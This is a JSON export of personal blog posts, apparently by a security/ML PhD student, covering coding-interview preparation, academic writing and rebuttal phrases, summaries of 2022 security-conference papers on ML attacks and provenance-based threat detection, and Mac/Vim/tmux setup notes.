opportunities are there to learn about it?  I am not familiar with technology X, but it sounds like a very interesting solution. Can you tell me a bit more about how it works?3. Technical QuestionHow to practice a Question?  Try to solve the problem on your own.  Write the code for the algorithm on paper.  Test your code on paper: general cases, base cases, error cases, and so on.  Type your paper code as-is into  a computer: start a list of all the errors you make to keep these in mind in the real interview.3.1 Must-have Knowledge            Data structure      Algorithms      Concepts                  Linked Lists      breadth First Search      Bit Manipulation              Binary Trees      Depth First Search      Singleton Design Pattern              Tries      Binary Search      Factory Design Pattern              Stacks      Merge Sort      Memory (Stack vs Heap)              Queues      Quick Sort      Recursion              Vectors/ArrayLists      Tree Insert/Find/e.t.c.      Big-O Time              Hash Table                    Make sure you understand how to use and implement them and, where applicable, what the space and time complexity is.For the data structure and algorithms, be sure to practice implementing them from scratch.Hash tables are important.3.2 Five Steps to a Technical Question  Ask your interviewer questions to resolve ambiguity: data types, data range, assumptions, who is the user?  Design an Algorithm          what is the space and time complexity?      What if there is a lot of data?      Does it cause other issues?      If there are other issues or limitations, did you make the right trade-offs?      If they gave specific data, have you leveraged that information? Usually there is a rason to give specific information.        Pseudocode  Code          Use data structures generously      Don’t crowd your coding: start fromt he upper left hand corner of a whiteboard.        Test:          Extreme cases: 0, negative,  null, maximums, minimums      User error: if user passes in null or a negative value?      General cases      3.3 Five Main Algorithm Approaches  Examplify  Pattern Matching: try to modify the solution to a related problem to develop an algorithm.  Simplify and Genearlize  Base case and Build  Data Structure Brainstorm: Linked list, Array, Binary tree, Heap, Dictionary…3.4 Good Code Properties  Correct  Efficient  Simple  Readable  Maintainable4. Interview Questions4.1 Data Structures  Arrays and Strings          Hash Tables: map keys to values for highly efficient lookup.                  ❗️practice both implementing and using hash table.                    ArrayList (Dynamically Resizing Array)      StringBuffer        Linked Lists          Creating a Linked List      Deleting a Node from a Singly Linked List      The Runner Technique      Recursive Problems        Stacks and Queues          Implementing a Stack      Implementing a Queue        Trees and Graphs          ❗️Potential Issues to Watch Out For                  Binary Tree vs Binary Search Tree          Balanced vs Unbalanced          Full and Complete                    Binary Tree Traversal                  in-order/post-order/pre-order traversal                    Tree Balancing: Red-Black Trees and AVL Trees      Tries      Graph Traversal                  Depth First Search          Breadth First Search                    4.2 Concepts and Algorithms4.2.1 Bit Manipulation\t- Bit Manipulation by Hand\t- Bit facts and Tricks\t- Common Bit Tasks: Get, Set, Clear, and Update Bit4.2.2 Brain Teasers\t- Start Talking\t- Develop Rules and Patterns\t- Worst Case Shifting\t- Algorithm Approaches: Consider 5 methods from 3.34.2.3 Mathematics and Probability\t- Prime Numbers\t\t- Divisibility\t\t- Checking for Primality\t\t- Generating a List of Primes: The Sieve of Eratosthenes\t- Probability\t\t- A and B\t\t- A or B\t\t- Independence\t\t- Mutual Exclusivity4.2.4 Object-Oriented Design  How to approach Object-Oriented Design Questions          Step 1: Handle Ambiguity (Some descriptiones are vague which need to make clear)      Step 2: Define the Core Objects      Step 3: Analyze Relationships      Step 4: Investigate Actions        Design Patterns          Singleton Class: a class can have only one instance.      Factory Method: an interface to create an instance of a class.      4.2.5 Recursion and Dynamic Programming  How to Approach          Bottom-Up Recursion      Top-Down Recursion        Dynamic Programming          A simple example: Fibonacci Number        Recursive vs. Iterative Solutions4.2.6 Scalability and Memory Limits  The Step-By-Step Approach          Step 1: Make believe                  Assuem the data can fit on one machine without limitations.                    Step 2: Get Real      Step 3: Solve Problems        What do you need to know: Information, Strategies and Issues          Dividing up lost of data                  by order of appearance          by hash value          by actual value          arbitrarily                    4.2.7 Sorting and Searching  Common Sorting Algorithms          Bubble Sort                  Runtime: average O ($n^2$) and worst case.          Memory: O (1).                    Selection Sort                  Runtime: average O ($n^2$) and worst case.          Memory: O (1).                    Merge Sort                  Runtime: average O ($n\\cdot Log(n)$) and worst case.          Memory: depends.                    Quick Sort                  Runtime: average O ($n\\cdot Log(n)$) and worst case O ($n^2$)          Memory: O ($Log(n)$)                    Radix Sort                  Runtime: average O($k\\cdot n$)                    4.2.8 Testing  What the interviewer is looking for?          Big picture understanding      Knowing how the pieces fit together      Organization      Practicality        Testing a Real World Object          Step 1: Who will use it? And why?      Step 2: What are the use cases?      Step 3: What are the bounds of use?      Step 4: What are the stress/ failure conditions?      Step 5: How would you perform the testing?        Testing a piece of Software          Manual vs. Automated Testing      Balck Box Testing vs. White Box Testing      Step 1: Are we doing Balck Box Testing or White Box Testing?      Step 2: Who will use it? And why?      Step 3: What are the use cases?      Step 4: What are the bounds of use?      Step 5: What are the stress conditions/failure conditions?      Step 6: What are the test cases? How would you perform the testing?        Testing a Function          Step 1: Define the test cases                  the normal case          the extremes          Nulls and “illegal” input          Strange input                    Step 2: Define the expected result      Step 3: Write test code        Troubleshooting Questions          Step 1: Understand the Scenario      Step 2: Break Down the Problem      Step 3: Create Specific, Manageable Tests      Reference  Cracking the Coding Interview: 150 Programming Questions and Solutions"
  },
  
  {
    "title": "CCS 20222 Summary",
    "url": "/posts/CCS2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-11-01 00:00:00 -0700",
    





    
    "snippet": "Paper List:  1D: Poisoning and Backdooring ML          Identifying a Training-Set Attack’s Target Using Renormalized Influence Estimation      ❓FenceSitter: Black-box, Content-Agnostic, and Synchro...",
    "content": "Paper List:  1D: Poisoning and Backdooring ML          Identifying a Training-Set Attack’s Target Using Renormalized Influence Estimation      ❓FenceSitter: Black-box, Content-Agnostic, and Synchronization-Free Enrollment-Phase Attacks on Speaker Recognition Systems      Truth Serum: Poisoning Machine Learning Models to Reveal Their Secrets      LoneNeuron: a Highly-effective Feature-domain Neural Trojan using Invisible and Polymorphic Watermarks        2G&amp;3A: Inference Attacks to ML MI attack explanation          Group Property Inference Attacks Against Graph Neural Networks      Are Attribute Inference Attacks Just Imputation?      Enhanced Membership Inference Attacks against Machine Learning Models      Membership Inference Attacks and Generalization: A Causal Perspective        3F: ⭕️Federated Learning Security          Eluding Secure Aggregation in Federated Learning via Model Inconsistency      EIFFeL: Ensuring Integrity for Federated Learning      pMPL: A Robust Multi-Party Learning Framework with a Privileged Party      Private and Reliable Neural Network Inference        4D: Attacks to ML          Physical Hijacking Attacks against Object Trackers      Feature Inference Attack on Shapley Values      When Evil Calls : Targeted Adversarial Voice over IP-Telephony Network      Order-Disorder: Imitation Adversarial Attacks for Black-box Neural Ranking Models        4I&amp;5B: Adversarial Examples in ML          Perception-Aware Attack: Creating Adversarial Music via Reverse-Engineering Human Perception      '’Is your explanation stable?’’: A Robustness Evaluation Framework for Feature Attribution      Post-breach Recovery: Protection against White-box Adversarial Examples for Leaked DNN Models      Harnessing Perceptual Adversarial Patches for Crowd Counting        5G&amp;6A&amp;6G: Priv &amp; Anon: Privacy Attacks in ML          SSLGuard: A Watermarking Scheme for Self-supervised Learning Pre-trained Encoders      Auditing Membership Leakages of Multi-Exit Networks      StolenEncoder: Stealing Pre-trained Encoders      Membership Inference Attacks by Exploiting Loss Trajectory      DPIS: an Enhanced Mechanism for Differentially Private SGD with Importance Sampling      NFGen: Automatic Non-linear Function Evaluation Code Generator for General-purpose MPC Platforms      On the Privacy Risks of Cell-Based NAS Architectures      LPGNet: Link Private Graph Networks for Node Classification        7J&amp;8C: Differential Privacy          Shifted Inverse: A General Mechanism for Monotonic Functions under User Differential Privacy      Frequency Estimation in the Shuffle Model with Almost a Single Message      Differentially Private Triangle and 4-Cycle Counting in the Shuffle Model      Widespread Underestimation of Sensitivity in Differentially Private Libraries and How to Fix It        8H: Privacy in Graphs          Graph Unlearning      Finding MNEMON: Reviving Memories of Node Embeddings      Identifying a Training-Set Attack’s Target Using Renormalized Influence EstimationThe paper buildan influence estimation to quantify the training data points’ contribution to a model’s prediction. They test on backdoor and poisoning attacks across various data domains like text, vision, and speech.❇️Truth Serum: Poisoning Machine Learning Models to Reveal Their SecretsAuthor: Reza Shokri (NUS), Nicholas Carlini(Google)The paper provides a poisoning attack to lead other users’ data privacy by membership inference, attribute inference, and data extraction.LoneNeuron: a Highly-effective Feature-domain Neural Trojan using Invisible and Polymorphic WatermarksThe paper designs a new model-poisoning attack that revise both the model structure and data points to add invisible, sample-specific, and polymorphic pixel-domain watermarks.❇️Group Property Inference Attacks Against Graph Neural NetworksThe paper summarizes the previous methods and design a black-box attacka and a white-box attack for property inference. They use GCN, Graphsage, and GAT as tearget models on three datasets: Pokec, Facebook, and Pubmed.The baselines look pretty simple.Privacy related?Are Attribute Inference Attacks Just Imputation?To understand attribute inference risks, the paper proposes a white-box attack that identifies neurons in a model that are most correlated with the sensitive value for a target attribute.Enhanced Membership Inference Attacks against Machine Learning ModelsAuthor: Reza Shokri (NUS)The paper proposes a hypothesis testing framework that use reference models to get better performance. They also make explanations and differential analysis about the attacks and what causes data points to be vulnerable.The paper is quite theoritical.Membership Inference Attacks and Generalization: A Causal PerspectiveAuthor: Prateek Saxena (NUS)The paper designs a causal graph to explain the influence of 6 attack variants."
  },
  
  {
    "title": "Academic Writing",
    "url": "/posts/Writing/",
    "categories": "",
    "tags": "PhD",
    "date": "2022-10-02 00:00:00 -0700",
    





    
    "snippet": "In this blog, I would like to talk about my summary about how to write a good paper or rebuttal in academia.Paper Writing  Determining the big picture:          Build the scaffolding before filling...",
    "content": "In this blog, I would like to talk about my summary about how to write a good paper or rebuttal in academia.Paper Writing  Determining the big picture:          Build the scaffolding before filling in the details. Write sections and topic setences first.                  Start at a high level by outlining sections.                    Assess balance and budget pages accordingly.      Follow the convention from other research papers like the paper structure.      Signpost your paper.                  Examples of signposts include: an outline of the paper at the end of the introduction (“The rest of this paper proceeds as follows.”), a preamble to each section (“In this section, we discuss…”), declarative subsection titles, and (within reason) bold paragraph headings (such as those in this blog post).                      Use figures and plots to support your text:          Keep figures as clean and simple as possible.                  Lines should not cross one another.          Fonts should be roughly the same size as the font size in the paper itself.          The use of ink should be minimized (no unnecessary shading, backgrounds or colors)                    Each plot should have exactly one technical point.                  Using different colors to show different methods when comparing them.                      Make a good impression:          Spend a lot of time on your introduction: start early.                  The introduction summarizes the story of your paper.                    Write the introduction first and last.                  Early to think about the following questions in the first round of introduction:                          What is the problem?              Why is it hard?              Why will the solution be interesting to readers if it is achieved?                                Check each claim in the introduction is supported by the results and data in the second round.                    Perform some “landscaping” on your paper.                  Place (and create) signposts, figures, and graphs to create whitespace and avoid “walls of text”.          Check your spelling.          Make the last page look decent.          Eliminate widows and dangling text.                          widows on paragraphs: paragraphs that end with a single word on the last line.                                            Be efficient:          Tailor the length of your paper to the information content.                  Remember the goal is to efficiently transfer information.                    Keep words simple and sentences short.                  Omit needless words.                    Eliminate redundancy.      Be as specific and precise as you can.      Use clear and consistent terminology.      Some questions that the reviewers care:  What is the main novelty?  How is the method proposed in the paper compared to existing works?  Compared with esisting works, what aspect does the paper improve on?  How does your method fundamentally differ from other methods?  What specific components of the method cause the improvement?Tips:  Write the related work section as an story.RebuttalSome useful sequences:Opening  Thank you for your suggestion.  Thank you for the positive/detailed/constructive comments.  We sincerely thank all reviewers and ACs for their time and efforts. Below please find the responses to some specific comments.  We thank the reviewers for their useful comments. The common questions are first answered, then we clarify questions from every individual review.  We thank the useful suggestions from the reviewers. Some important or common questions are first addressed, followed by answers to individual reviews.Agree  We thank the reviewer for pointing out this issue.  We agree with you and have incorporated this suggestion throughout our paper.  We have reflected this comment by …  We can/will add/compare/revise/correct … in our revised manuscript/our final version.  Due to the rebuttal policy, “authors should not include new experimental results in the rebuttal”, additional results may not be included. However, we will add these mentioned experiments and discussions in our final version. Thank you for the constructive comment.Disagree  We respectfully disagree with Reviewer #id that …  The reviewer might have overlooked Table #id …  We can compare … but it is not quite related to our work …  We have to emphasize that …  The reviewer raises an interesting concern. However, our work …  Thank you for the comment, but we cannot fully agree with the comment. As stated/emphasized …  You have raised an important point; however, we believe that … would be outside the scope of our paper because …  This is a valid assessment of …; however, we believe that … would be more appropriate because …Explain  We have indeed stated/included/discussed/compared/reported/clarified/elaborated … in our original paper … (cf. Line #id).  As we stated in Line #id, …  We have rewritten … to be more in line with your comments. We hope that the edited section clarifies …Extra Information  We have included a new figure/table (cf. Figure/Table #id) to further illustrate…  We have supplemented the xxx section with explanations of …  Thank you for the comment. We will explore this in future work.AC Message  Please note that Assigned Reviewer #id has made some statements that are either against the common-sense in our field or self-contradictory (ironically his/her own confidence rating is “very confident”). blabla  We want to bring to your attention the very flawed review \\#id. This reviewer is self-contradictory, cf. Comment #id1, Comment #id2, and Response #id. blabla  We would like to raise attention to AC that unfortunately Reviewer #id holds a very biased view towards the contributions of our paper. blablaReference:  https://zhuanlan.zhihu.com/p/431583258  https://zhuanlan.zhihu.com/p/104298923  https://medium.com/great-research/storytelling-101-writing-tips-for-academics-d9eec50eec9"
  },
  
  {
    "title": "Usenix Security 2022",
    "url": "/posts/Usenix-2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-08-25 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from Usenix Security 2022 which are related to my research interests. Basically, Usenix Security 2022 has three accepted paper lists from summer, fall, an...",
    "content": "In the blog, I summary the accepted papers from Usenix Security 2022 which are related to my research interests. Basically, Usenix Security 2022 has three accepted paper lists from summer, fall, and winter:  Summer: https://www.usenix.org/conference/usenixsecurity22/summer-accepted-papers  Fall: https://www.usenix.org/conference/usenixsecurity22/fall-accepted-papers  Winter: https://www.usenix.org/conference/usenixsecurity22/winter-accepted-papersInteresting Paper list  Summer          Back-Propagating System Dependency Impact for Attack Investigation      ML-Doctor: Holistic Risk Assessment of Inference Attacks Against Machine Learning Models      DeepDi: Learning a Relational Graph Convolutional Network Model on Instructions for Fast and Accurate Disassembly      Distinguished Paper Award: Online Website Fingerprinting: Evaluating Website Fingerprinting Attacks on Tor in the Real World      Rapid Prototyping for Microarchitectural Attacks      On the Security Risks of AutoML      Inference Attacks Against Graph Neural Networks      WebGraph: Capturing Advertising and Tracking Information Flows for Robust Blocking      Distinguished Paper Award: [Dos and Don’ts of Machine Learning in Computer Security](https://www.usenix.org/conference/usenixsecurity22/presentation/arp      Label Inference Attacks Against Vertical Federated Learning        Fall          PatchCleanser: Certifiably Robust Defense against Adversarial Patches for Any Image Classifier      Poisoning Attacks to Local Differential Privacy Protocols for Key-Value Data      Transferring Adversarial Robustness Through Robust Representation Matching      Distinguished Paper Award: Provably-Safe Multilingual Software Sandboxing using WebAssembly      On the Necessity of Auditable Algorithmic Definitions for Machine Unlearning      Mitigating Membership Inference Attacks by Self-Distillation Through a Novel Ensemble Architecture      Membership Inference Attacks and Defenses in Neural Network Pruning      How Machine Learning Is Solving the Binary Function Similarity Problem      FLAME: Taming Backdoors in Federated Learning        Winter          AutoDA: Automated Decision-based Iterative Adversarial Attacks      Poison Forensics: Traceback of Data Poisoning Attacks in Neural Networks      Blacklight: Scalable Defense for Neural Networks against Query-Based Black-Box Attacks      I will keeping summarizing the interesting papers here.Poison Forensics: Traceback of Data Poisoning Attacks in Neural NetworksPaperAuthor: Shawn Shan, Arjun Nitin Bhagoji, Haitao Zheng, Ben Y. ZhaoMain IdeaThe paper points out the impossibility for the defense of adaptive adversarial attacks and provides a traceback method to tell the adversarial examples.Key insightExperimentsDos and Don’ts of Machine Learning in Computer SecurityPaperAuthor: Daniel Arp, Erwin Quiring, Feargus Pendlebury, Alexander Warnecke, Fabio Pierazzi, Christian Wressnegger, Lorenzo Cavallarok, Konrad RieckMain IdeaThis paper lists ten common issues in the AI security papers with the explanations and potential solutions. It also decorates them by analysizing the impact with examples.The figure shows the ten pitfalls and their corresponding stages in the ML workflow.Key insightPitfalls list  Data collection and Labeling          Sampling Bias: The collected data are not representitive enough to show the real data distribution.      Label Inaccuracy: The ground truth labels are not accurate, stable.        System Design and Learning          Data Snooping: The training data are not available in practice.      Spurious correlations: Unrelated shortcut patterns for separating classes.      Biased Parameters: Some parameters are based on the test set instead of fixing at training time.        Performance Evaluation          Inappropriate Baselines: Without or with limited baseline methods is in appropriate.      Inappropriate Measures: The performance measures do not account for the constraints of the application scenario.      Base rate Fallacy: One class imbalance which does not consider when interpreting the performance measures.        Deployment and Operation          Lab-only Evaluation: The leaning model is evaluated in a lab environment only instead of discussing the practical limitations.      Inappropriate Threat Model: The robustness of machine learning models is negelected such as poisoning and evasion attacks.      Impact AnalysisThe paper works on four applications:  Mobile malware detection  Vulnerability discovery  source code authorship attribution  network intrusion detection"
  },
  
  {
    "title": "Paper Summary 2022",
    "url": "/posts/Paper_Summary_2022/",
    "categories": "Papers, Reading",
    "tags": "",
    "date": "2022-07-02 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summarize the papers I feel interested and record some thoughts when reading.Rethinking Graph Neural Netowrks for Anomaly Detectionpaper/codeMain IdeaBased on the observation that an...",
    "content": "In the blog, I summarize the papers I feel interested and record some thoughts when reading.Rethinking Graph Neural Netowrks for Anomaly Detectionpaper/codeMain IdeaBased on the observation that anomalies lead to the right-shift effect in spectral energy distribution from low-frequencies to high frequencies, the paper propose Beta Wavelet GNN to get better performance.Key insight  Spectral Analysis of Graph Anomaly                                                      They define the anomaly degree $\\sigma /              \\mu              $ wherethe graph features are independent frawn from a Gaussian distribution: $x\\sim N(\\mu e_N,\\sigma^2I_N)$.                                          They observe that with the increase of the degree of anomaly nodes, the spectral energy concentrate less on low-frequency eigenvalues.      They redefine the high-drequency area to avoid the high cost of eigen-decomposition:                  \\[S_{high}=\\int_0^{\\lambda_N} 1-f(t)dt\\]                                Hammond’s Graph Wavelet          It is composed of a mother wave and a group of wavelet bases: $W=(W_{\\psi_1}, W_{\\psi_2},\\cdots)$      $W_{\\psi_i}(x)=Ug_i(\\Lambda)^T x$ where $g_i(\\cdot)$ is a kernel function and $g_i(\\lambda)=diag(g_i(\\lambda))$.  -        Beta Wavelet on Graph  Beta Wavelet Graph Neural Network          $Z_i=W_{i, C-i}(MLP(X))$      $H=AGG([Z_0, Z_1, \\cdots, Z_C])$      ExperimentsDatasets:  YelpChi  AmazonComparisons:  MLP/SVM  GCN/ChebyNet/GAT/GraphSAGE…  GraphConsis/CAREGNN…A Comparative Study for Unsupervised Network Representation LearningarxivMain IdeaThe paper summarizes several unsupervised network representation learning (UNRL) approaches over graphs:  Random Walk based  Matrix Factorization  Deep Learning basedThey consider 9 UNRL methods and 11 datasets on two tasks: node classification and link prediction, and analyze all of them to show a clear blueprint of the topic.The involved algorithms are listed in the table:ExperimentsDatasets:Graph Structure of Neural Networksarxiv/code/ ICML2020Main IdeaThe paper takes the neural networks as graphs and develops a graph-based representation called relational graph. Then they design a graph generator WS-flex to systematically explore the design space of neural networks.In the Average Path Length-Clustering Coefficient figures, they claim to find sweet spots to find the best performance models. They furthermore provide a quick way to identify a sweet spot.SIGL: Securing Software Installations Through Deep Graph LearningarXivMain IdeaThe paper designs a tool, SIGL, to detect malicious behavior on software installation. It first build the provenace graphs by system call activities. Then it uses Graph LSTM as an autoencoder to generate embeddings.System Overview:  Data Collection and Featurization  Model Training and Validation  Anomaly Detection and Prioritization    Key insights    Formalize the problem of detecting malicious software installation.  Define the Software Installation Graphs and use an autoencoder to generate graph-level embeddings.Threat modelThey define the installation behavior of a software package as a chain of system events which can be displayed as a directed acyclic graph. Nodes represent processes and objects while edges represent interactions. The operating system and audit framework are benign.ExperimentsDataset: synthetic dataset on Windows ETW and Linux AduitIt also consider the poisoning attack and adversarial attack. For poisoning attacks, different ratios of malware data from 5% to 25% are added.For adversarial attacks, they design restrict black-box attack (RBA) including feature and structure attacks and practical black-box attack (PBA) including hierarchical reinforcement learning attack.You are what you do: Hunting Stealthy Malware via Data Provenance Analysispaper/slide/videoMain ideaThe paper designs a provenance-based approach ProvDetector to detect stealthy malware.  Provenance graph building  Representation Extraction          Rareness-based path selection        Embedding  Anomaly DetectionKey insights  Detection of marginal deviation: Impersonation-based stealthy malware blends into benign programs. ProvDetector needs to identify and isolate the marginal outlier events from the benign behaviors.  Scalable model building: The size of provenance graphs is super large. ProvDetector works on the suspicious subgraphs by ranking the top $K$ uncommon causal paths.Threat ModelThe paper concentrates on stealthy malware that leverages legitimate methods or machine services from the victim’s host to exploit and execute malicious activities.  The operating systems and the loggers are benign or in the trusted computing base (TCB) and the adversary cannot change the records.  The side channel attack is also not consideredExperimentsThey collected process instances from 23 programs. In conclusions, they tested on 1150 malware samples that hijack benign processes.They also evaluated the interpretation of detection results.  Simple models do not perform well because they can only consider one hop neighborhoods.  Whole Graph modeling is not a good feature based on their experiments when they use graph2vec to detect hijacked process attacks.Log2vec: A heterogeneous Graph Embedding Based Approach for Detecting Cyber Threats within Enterprisepaper/Main ideaThe paper design an embedding generator to detect malicious logs. It firstly build a heterogeneous graph from logs  that each node represents the log event and they design 10 rules to decide the edges. Basically, the edges show the common hosts or temporal sequence between nodes.In general, the heterogeneous graph looks like a self-defined connections instead of the raw node interaction structures.After the graph generating, they use random walk and word2vec to generate the node embedddings and clustering algorithm to detect anomaly nodes.Key insights  The graph definition is totally different from provenance graphs. It looks like a multi-dimensional log sequence.  It did not use GNN models. Instead, Random walk + word2vec is used.Experimentsdatasets:  cert  LANLLearning Causal Effects on Hypergraphspaper/codeMain IdeaThe paper concentrates on individual treatment effect (ITE) estimation on hypergraphs. One example of ITE estimation is how much an intervention (wearing face covering) will causally afect an outcome (COVID-19 infection) of each individual node. They use a hypergraph neural network to learn high-order interference.Key insights  The first one works on the problem of ITE estimation under high-order interference on hypergraphs.  Design a framework to models confounders and high-order interference by representation learning and hypergraph neural networks.ExperimentsDataset: Semi-synthetic data from Contact, Goodreads and Microsoft Teams.Multi-Dimensional Network Embedding with Hierarchical StructurepaperMain IdeaThe paper designs a multi-dimensional graph model that considers the edge types and node types in different layers/dimensions. For example, if a set of nodes can be shown as users/products and edges can be viewing or purchasing, we can draw two graphs that represent viewing and purchasing information. In that case, two graphs have same nodes but different edges.Model Structure  For different edge types, using a specific embedding to record the dimension information.  For different node types, using an embedding to record the hierarchical strucutre information.  Use a skip-gram model to learn the embeddings. And simply adding the embeddings together.GraphMAE: Self-Supervised Masked Graph Autoencoderspaper/codeMain IdeaThe paper focuses on Self-supervised Learning (SSL) by graph autoencoders (GAEs). It lists four common problems of the current models:  The structure information is over-emphasized.  Feature reconstruction without corruption is not robust.  The mean square error is sensitive and unstable.  The decoder architectures are of little expressiveness.They improve the following parts:  Masked feature reconstruction.  Scaled cosine error.  Re-mask decoding.Background of Self-supervised Learning[1]  Generative: Use an encoder to generate middle vector $z$ and use an decoder to rebuild the orginal input $x$.  Contrastive: After getting the middle vector $z$, compare the similarity.  Generative-Contrastive: Based on the generative model, use a large model like ResNet to compare them.Model Techniques  Use feature reconstruction as the objective.  Reconstruct the masked features and apply a uniform random sampling strategy.  Use a GNN-decoder with re-mask decoding.  Use scaled cosine error as the criterion.Reference:            Self-supervised Learning: Generative or Contrastive      "
  },
  
  {
    "title": "S&P2022",
    "url": "/posts/S&P_2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-06-01 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from S&amp;P 2022 which are related to my research interests from the link.Papers:  BadEncoder: Backdoor Attacks to Pre-trained Encoders in Self-Supervise...",
    "content": "In the blog, I summary the accepted papers from S&amp;P 2022 which are related to my research interests from the link.Papers:  BadEncoder: Backdoor Attacks to Pre-trained Encoders in Self-Supervised Learning  DEPCOMM: Graph Summarization on System Audit Logs for Attack Investigation  DeepCASE: Semi-Supervised Contextual Analysis of Security Events  Effective Seed Scheduling for Fuzzing with Graph Centrality Analysis  LinkTeller: Recovering Private Edges from Graph Neural Networks via Influence Analysis  Membership inference attacks from first principles  Model Stealing Attacks Against Inductive Graph Neural Networks  ShadeWatcher: Recommendation-guided Cyber Threat Analysis using System Audit Records  WtaGraph: Web Tracking and Advertising Detection using Graph Neural NetworksDEPCOMM: Graph Summarization on System Audit Logs for Attack Investigationpaper/codeMain IdeaDepComm is a provenance graph summarization framework which uses InfoPaths to capture the attack-related processes and assist attack investigation.  Graph Summarization:          Process-based community Detection: Hierarchical Random Walk considering local neighbors and global process lineage trees.      Community Compression      Community Summarization: including a master process, time span, the top-ranked infoPath        Attack Investigation: find the events close to the POI (Point of Interest)Key insight (Why is the paper better than others?)The challenges:  The provenance graphs are heterogeneous while a general summarization takes the nodes equally.  The provenance graphs have plenty of trival and irrelevant dependencies.  No suitable graph summarization techniques.The insights:  It partitions graphs into process-centric communities (a group of processes and resources accessed by the processes) based on the observations:          The cooperated process nodes (intimate processes) either have strong correlation or data dependencies through resource nodes which means:                  They have parent-child relationships.          They share the same parent process and have data dependencies.          They summarize 8 different schemes for parent-child nodes, resources to list the way hierarchical random walk works.                      It compresses the edges by process and resource patterns.          Process-based patterns: the middle processes of the begin and end processes are parallel.      Resource-based patterns: the middle resources of the begin and end processes are parallel.        It prioritizes the InfoPaths to show the attack steps or major system activities at the top.ExperimentsDatasets:  Darpa TC 3Details:  Compare with Nodoze.  Cooperate with HOLMES.Comments:  It does not think about the temporal information.  The main insight is the graph summarization.  POI (Point of interest) is required.DeepCase: Semi-supervised Contextual Analysis of Security Eventspaper/codeMain IdeaThe paper designs a semi-supervised context-based suspecious event detector DeepCase to reduce the false positive alerts.The Model is composed of the following parts:  Context Builder          Encoder: Embedding layers+Recurrent layers      Attention Decoder        InterpreterKey InsightsThe previous methods concentrate on:  reducing the number of false positive ratio by improving individual detectors  prioritizing alerts (alert triaging)          miss some relatively benign events from a complicated attack.      Deepcase addresses the challenges (Complex relations, Evolving, Explainable):  handle complex relations within sequences of events from an evolving threats  remain explainable to security operators.ExperimentsDatasets:  Lastline  HDFSComparisons:  Cluster N-gram…ShadeWatcher: Recommendation-guided Cyber Threat Analysis using System Audit Recordspaper/codeMain IdeaThe paper leverages user-item interactions in recommendation systems and design a new framework ShadeWatcher to predict the system entity preferences on interactive entities to detect threats on audit records with the help of the high-order information.The high-order information here means the side information like genre of movies, type of files and other non-topology information.ShadeWatcher has three parts:  Knowledge Builder  Recommendation Model  Threat Detector and Adaptor          Retrain with the new negative instance.      Key insightThe problems of the current methods:  Statistics-based detection: high false positive rate.  Specification-based detection: time-consuming and domain expertise needed.  Learning-based detection:          No explicable results or insights on the essential indicators or root causes of the attacks.      Extra manual efforts needed.      ShadeWatcher leverages high-order information in the knowledge graphs to help the model detect malicious interactions.ExperimentsDatasets:  Trace from Darpa 3  Simulated DatasetEvaluation  on normal workloads  on classificationCompare with  Poirot  Morse  UnicornEfficiency"
  },
  
  {
    "title": "Macbook Summary",
    "url": "/posts/Macbook_Summary/",
    "categories": "",
    "tags": "System",
    "date": "2022-05-24 00:00:00 -0700",
    





    
    "snippet": "How to develop your personal Mac Environment for programDownloaded Applications:  Chrome  iTerm2 by Homebrew  VsCode insider  OneNote  ToDo List (Microsoft)  Wechat  Zoom  Obsidian (Markdown)  Oned...",
    "content": "How to develop your personal Mac Environment for programDownloaded Applications:  Chrome  iTerm2 by Homebrew  VsCode insider  OneNote  ToDo List (Microsoft)  Wechat  Zoom  Obsidian (Markdown)  OnedirveProgram:  iTerm 2          Powerlevel10k: https://github.com/romkatv/powerlevel10k (On-my-zsh)      Theme: Dracula+      zsh-autosuggestions      zsh-syntax-highlighting        Vim          Vundle: plugin manager      1. Tamper monkeyIt is a chrome plugin which can write scripts to auto-complete some tasks. Some well-done scripts are available from Greasy Fork.There is a book diving into Greasemonkey, a similar plugin of Firefox. I will record several important parts here.1.1 Basic Concepts1.2 Writing Scripts2. Vim ConfigurationVim is one of the best text editors which is highly configurable in Unix.Quick Start:  git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim  vim ~/.vimrc: vim configuration file  Launch vim and run :PluginInstallTips:      use :set encoding=utf-8 to resolve the display problem in Chinese        use :h vundle to acquire specific helps and commands  Tmux ConfigurationTmux is a remote server connecting tool which can keep long-term connections without breaking down.The configuration files come from gpakosz.tmux configuration filetmux.local configuration fileOh-my-zshOh-my-zsh is a useful and friendly command tool with a lot of functions."
  },
  
  {
    "title": "NDSS2022",
    "url": "/posts/NDSS_2022/",
    "categories": "Papers, Conference",
    "tags": "",
    "date": "2022-04-01 00:00:00 -0700",
    





    
    "snippet": "In the blog, I summary the accepted papers from NDSS 2022 which are related to my research interests from the link.Paper list:  Session 2C: ML and AI          Tetrad: Actively Secure 4PC for Secure...",
    "content": "In the blog, I summary the accepted papers from NDSS 2022 which are related to my research interests from the link.Paper list:  Session 2C: ML and AI          Tetrad: Actively Secure 4PC for Secure Training and Inference      MIRROR: Model Inversion for Deep Learning Network with High Fidelity      Local and Central Differential Privacy for Robustness and Privacy in Federated Learning                  The paper evaluate the effect of LDP and CDP to protect the FL model robustness from membership, backdoor attacks.                    DeepSight: Mitigating Backdoor Attacks in Federated Learning Through Deep Model Inspection                  Analyze the data distribution features to identify malicious model updates in the federated learning                      Session 4C: ML and AI          What You See is Not What the Network Infers: Detecting Adversarial Examples Based on Semantic Contradiction                  Analyze the adversarial examples’ internal features.          A pretty interesting story.                    Euler: Detecting Network Lateral Movement via Scalable Temporal Graph Link Prediction                  Temporal GNN model.                    Fooling the Eyes of Autonomous Vehicles: Robust Physical Adversarial Examples Against Traffic Sign Recognition Systems                  Adversarial attack on the objective detection models like YOLO v5.                    FedCRI: Federated Mobile Cyber-Risk Intelligence                  Cyber-Threat Intelligence                      Session 5C: Attacks on ML and AI          ATTEQ-NN: Attention-based QoE-aware Evasive Backdoor Attacks                  Attention-based evasive backdoor attack.          The paper is interesting: Leveraging the image generator techniques to generate the trigger or backdoor!                    RamBoAttack: A Robust and Query Efficient Deep Neural Network Decision Exploit                  A query efficient attack.                    Property Inference Attacks Against GANs      Get a Model! Model Hijacking Attack Against Machine Learning Models      DeepSight: Mitigating Backdoor Attacks in Federated Learning Through Deep Model Inspectionpaper/codeMain 